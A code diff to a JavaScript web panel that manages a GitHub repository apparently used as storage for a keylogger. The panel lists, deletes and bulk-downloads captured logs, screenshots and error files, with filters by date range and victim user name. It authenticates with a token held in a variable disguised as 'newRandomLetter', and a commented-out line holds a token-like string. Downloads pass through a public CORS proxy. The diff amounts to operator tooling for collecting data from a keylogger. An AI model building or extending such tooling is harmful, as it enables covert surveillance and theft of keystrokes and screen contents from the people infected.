@@ -178,7 +178,7 @@ const GITHUB_API_BASE = "https://api.github.com/repos/bebedudu/keylogger/content
 
 // Fetch and display the number of files in each folder on page load
 document.addEventListener("DOMContentLoaded", async () => {
-    const folders = ["config", "cache", "screenshots", "logs", "keylogerror"];
+    const folders = ["cache", "config", "keylogerror", "logs", "screenshots"];
 
     for (const folder of folders) {
         try {
@@ -215,11 +215,11 @@ async function deleteFiles() {
 
     // Map of folder names to their checkbox, input elements, and progress span
     const folderInputs = [
-        { folder: "config", checkbox: document.getElementById("configCheckbox"), countInput: document.getElementById("configCount"), progressSpan: document.getElementById("configProgress") },
         { folder: "cache", checkbox: document.getElementById("cacheCheckbox"), countInput: document.getElementById("cacheCount"), progressSpan: document.getElementById("cacheProgress") },
-        { folder: "screenshots", checkbox: document.getElementById("screenshotsCheckbox"), countInput: document.getElementById("screenshotsCount"), progressSpan: document.getElementById("screenshotsProgress") },
+        { folder: "config", checkbox: document.getElementById("configCheckbox"), countInput: document.getElementById("configCount"), progressSpan: document.getElementById("configProgress") },
+        { folder: "keylogerror", checkbox: document.getElementById("keylogerrorCheckbox"), countInput: document.getElementById("keylogerrorCount"), progressSpan: document.getElementById("keylogerrorProgress") },
         { folder: "logs", checkbox: document.getElementById("logsCheckbox"), countInput: document.getElementById("logsCount"), progressSpan: document.getElementById("logsProgress") },
-        { folder: "keylogerror", checkbox: document.getElementById("keylogerrorCheckbox"), countInput: document.getElementById("keylogerrorCount"), progressSpan: document.getElementById("keylogerrorProgress") }
+        { folder: "screenshots", checkbox: document.getElementById("screenshotsCheckbox"), countInput: document.getElementById("screenshotsCount"), progressSpan: document.getElementById("screenshotsProgress") }
     ];
 
     try {
@@ -284,7 +284,8 @@ async function deleteFiles() {
                 const file = filesToDelete[deletedCount];
 
                 try {
-                    await deleteFileWithRetry(file.path, file.sha, 3); // Retry up to 3 times
+                    // await deleteFileWithRetry(file.path, file.sha, 3); // Retry up to 3 times
+                    await deleteFileWithRetry(file.path, file.sha, terminalLog, 3); // Retry up to 3 times
                     folder.deletedCount++;
                     folder.progressSpan.textContent = `${folder.deletedCount}/${numFilesToDelete}`;
                     logToTerminal(`Deleted: ${file.name} from folder: ${folderName}`, terminalLog);
@@ -304,22 +305,22 @@ async function deleteFiles() {
     }
 }
 
-async function deleteFileWithRetry(filePath, sha, retries) {
-    let attempt = 1;
+// async function deleteFileWithRetry(filePath, sha, retries) {
+//     let attempt = 1;
 
-    while (attempt <= retries) {
-        try {
-            await deleteFile(filePath, sha);
-            return; // Success, exit the loop
-        } catch (error) {
-            if (attempt === retries) {
-                throw new Error(`All ${retries} attempts failed. Last error: ${error.message}`);
-            }
-            logToTerminal(`Attempt ${attempt} failed for file: ${filePath.split('/').pop()}. Retrying...`, document.getElementById('terminal-log'));
-            attempt++;
-        }
-    }
-}
+//     while (attempt <= retries) {
+//         try {
+//             await deleteFile(filePath, sha);
+//             return; // Success, exit the loop
+//         } catch (error) {
+//             if (attempt === retries) {
+//                 throw new Error(`All ${retries} attempts failed. Last error: ${error.message}`);
+//             }
+//             logToTerminal(`Attempt ${attempt} failed for file: ${filePath.split('/').pop()}. Retrying...`, document.getElementById('terminal-log'));
+//             attempt++;
+//         }
+//     }
+// }
 
 async function deleteFile(filePath, sha) {
     const deleteUrl = `https://api.github.com/repos/bebedudu/keylogger/contents/${encodeURIComponent(filePath)}`;
@@ -530,24 +531,234 @@ async function deleteFileWithRetry(filePath, sha, terminalLog, retries) {
     }
 }
 
-async function deleteFile(filePath, sha, terminalLog) {
-    const deleteUrl = `https://api.github.com/repos/bebedudu/keylogger/contents/${encodeURIComponent(filePath)}`;
+// async function deleteFile(filePath, sha, terminalLog) {
+//     const deleteUrl = `https://api.github.com/repos/bebedudu/keylogger/contents/${encodeURIComponent(filePath)}`;
 
-    const response = await fetch(deleteUrl, {
-        method: "DELETE",
-        headers: {
-            "Authorization": `token ${newRandomLetter}`,
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            message: `Deleted: ${filePath.split('/').pop()}`,
-            sha: sha
-        })
-    });
+//     const response = await fetch(deleteUrl, {
+//         method: "DELETE",
+//         headers: {
+//             "Authorization": `token ${newRandomLetter}`,
+//             "Content-Type": "application/json"
+//         },
+//         body: JSON.stringify({
+//             message: `Deleted: ${filePath.split('/').pop()}`,
+//             sha: sha
+//         })
+//     });
 
-    if (!response.ok) {
-        const errorData = await response.json();
-        throw new Error(`GitHub API Error: ${errorData.message}`);
+//     if (!response.ok) {
+//         const errorData = await response.json();
+//         throw new Error(`GitHub API Error: ${errorData.message}`);
+//     }
+// }
+
+// function logToTerminal(message, terminalLog) {
+//     const logEntry = document.createElement("p");
+//     logEntry.textContent = message;
+//     terminalLog.appendChild(logEntry);
+//     terminalLog.scrollTop = terminalLog.scrollHeight;
+// }
+
+
+
+
+
+
+// download files
+// const GITHUB_API_BASE = "https://api.github.com/repos/bebedudu/keylogger/contents";
+// const newRandomLetter = "dfsghp_F7mmXrLHwlyu8IC6jOQmfsdaf9aCE1KIehT3tLJiadfs"; // Replace with your GitHub PAT
+
+
+// no. of file is effecting now all menu item (x date & time range also need this)
+async function performDownload() {
+    const terminalLog = document.getElementById('downloadTerminalLog');
+    const resultDiv = document.getElementById('downloadResult');
+
+    // Clear previous terminal log
+    terminalLog.innerHTML = "";
+
+    // Get user-selected action
+    const action = document.querySelector('input[name="downloadAction"]:checked')?.value;
+
+    if (!action) {
+        resultDiv.textContent = "Please select an action.";
+        return;
+    }
+
+    // Get folder paths, date/time ranges, file counts, and user names
+    const folderPaths = [
+        document.getElementById('downloadFolderPath1').value,
+        document.getElementById('downloadFolderPath2').value,
+        document.getElementById('downloadFolderPath3').value,
+        document.getElementById('downloadFolderPath4').value,
+        document.getElementById('downloadFolderPath5').value,
+        // Add more folders as needed
+    ];
+
+    const startDates = [
+        document.getElementById('downloadStartDate1').value,
+        document.getElementById('downloadStartDate2').value,
+        document.getElementById('downloadStartDate3').value,
+        document.getElementById('downloadStartDate4').value,
+        document.getElementById('downloadStartDate5').value,
+        // Add more folders as needed
+    ];
+
+    const startTimes = [
+        document.getElementById('downloadStartTime1').value,
+        document.getElementById('downloadStartTime2').value,
+        document.getElementById('downloadStartTime3').value,
+        document.getElementById('downloadStartTime4').value,
+        document.getElementById('downloadStartTime5').value,
+        // Add more folders as needed
+    ];
+
+    const endDates = [
+        document.getElementById('downloadEndDate1').value,
+        document.getElementById('downloadEndDate2').value,
+        document.getElementById('downloadEndDate3').value,
+        document.getElementById('downloadEndDate4').value,
+        document.getElementById('downloadEndDate5').value,
+        // Add more folders as needed
+    ];
+
+    const endTimes = [
+        document.getElementById('downloadEndTime1').value,
+        document.getElementById('downloadEndTime2').value,
+        document.getElementById('downloadEndTime3').value,
+        document.getElementById('downloadEndTime4').value,
+        document.getElementById('downloadEndTime5').value,
+        // Add more folders as needed
+    ];
+
+    const fileCounts = [
+        parseInt(document.getElementById('downloadFileCount1').value),
+        parseInt(document.getElementById('downloadFileCount2').value),
+        parseInt(document.getElementById('downloadFileCount3').value),
+        parseInt(document.getElementById('downloadFileCount4').value),
+        parseInt(document.getElementById('downloadFileCount5').value),
+        // Add more folders as needed
+    ];
+
+    const userNames = [
+        document.getElementById('downloadUserName1').value.trim(),
+        document.getElementById('downloadUserName2').value.trim(),
+        document.getElementById('downloadUserName3').value.trim(),
+        document.getElementById('downloadUserName4').value.trim(),
+        document.getElementById('downloadUserName5').value.trim(),
+        // Add more folders as needed
+    ];
+
+    try {
+        for (let i = 0; i < folderPaths.length; i++) {
+            const folderPath = folderPaths[i];
+            const startDate = startDates[i];
+            const startTime = startTimes[i];
+            const endDate = endDates[i];
+            const endTime = endTimes[i];
+            const fileCount = fileCounts[i];
+            const userName = userNames[i];
+
+            logToTerminal(`Processing folder: ${folderPath}`, terminalLog);
+
+            const folderUrl = `${GITHUB_API_BASE2}/${folderPath}`;
+            const response = await fetch(folderUrl, {
+                headers: {
+                    "Authorization": `token ${newRandomLetter}`
+                }
+            });
+
+            if (!response.ok) {
+                logToTerminal(`Failed to fetch files from folder: ${folderPath} - ${response.statusText}`, terminalLog);
+                continue;
+            }
+
+            const files = await response.json();
+
+            if (files.length === 0) {
+                logToTerminal(`No files found in folder: ${folderPath}`, terminalLog);
+                continue;
+            }
+
+            // Sort files by date (most recent first)
+            const sortedFiles = files.sort((a, b) => {
+                const dateA = a.name.match(/^(\d{8})_(\d{6})/);
+                const dateB = b.name.match(/^(\d{8})_(\d{6})/);
+                if (!dateA || !dateB) return 0;
+                return `${dateB[1]}${dateB[2]}`.localeCompare(`${dateA[1]}${dateA[2]}`);
+            });
+
+            // Filter files based on the selected action
+            let filteredFiles = [];
+            if (action === "downloadInRange") {
+                filteredFiles = sortedFiles.filter(file => {
+                    const match = file.name.match(/^(\d{8})_(\d{6})/);
+                    const fileDate = match?.[1];
+                    const fileTime = match?.[2];
+                    if (fileDate && fileTime) {
+                        return (
+                            fileDate >= startDate &&
+                            fileDate <= endDate &&
+                            fileTime >= startTime &&
+                            fileTime <= endTime
+                        );
+                    }
+                    return false;
+                });
+            } else if (action === "downloadByUser") {
+                filteredFiles = sortedFiles.filter(file => file.name.includes(userName));
+            } else if (action === "downloadCount") {
+                filteredFiles = sortedFiles;
+            }
+
+            // Apply the "Number of Files to Download" limit
+            const filesToDownload = filteredFiles.slice(0, fileCount);
+
+            // Download files
+            for (const file of filesToDownload) {
+                const downloadUrl = file.download_url;
+                if (!downloadUrl) {
+                    logToTerminal(`Skipping file (no download URL): ${file.name} from folder: ${folderPath}`, terminalLog);
+                    continue;
+                }
+
+                try {
+                    await downloadFile(downloadUrl, file.name, terminalLog);
+                    logToTerminal(`Downloaded file: ${file.name} from folder: ${folderPath}`, terminalLog);
+                } catch (error) {
+                    logToTerminal(`Error downloading file: ${file.name} from folder: ${folderPath} - ${error.message}`, terminalLog);
+                }
+            }
+        }
+
+        resultDiv.textContent = "Operation completed. Check the terminal log for details.";
+    } catch (error) {
+        console.error(error);
+        resultDiv.textContent = `Error: ${error.message}`;
+    }
+}
+
+async function downloadFile(url, fileName, terminalLog) {
+    try {
+        // Use a CORS proxy to bypass CORS restrictions
+        const proxyUrl = `https://cors-anywhere.herokuapp.com/${url}`;
+        const response = await fetch(proxyUrl, {
+            headers: {
+                "Authorization": `token ${newRandomLetter}`
+            }
+        });
+
+        if (!response.ok) {
+            throw new Error(`Failed to download file: ${response.statusText}`);
+        }
+
+        const blob = await response.blob();
+        const link = document.createElement("a");
+        link.href = URL.createObjectURL(blob);
+        link.download = fileName;
+        link.click();
+    } catch (error) {
+        throw new Error(`Error downloading file: ${error.message}`);
     }
 }
 
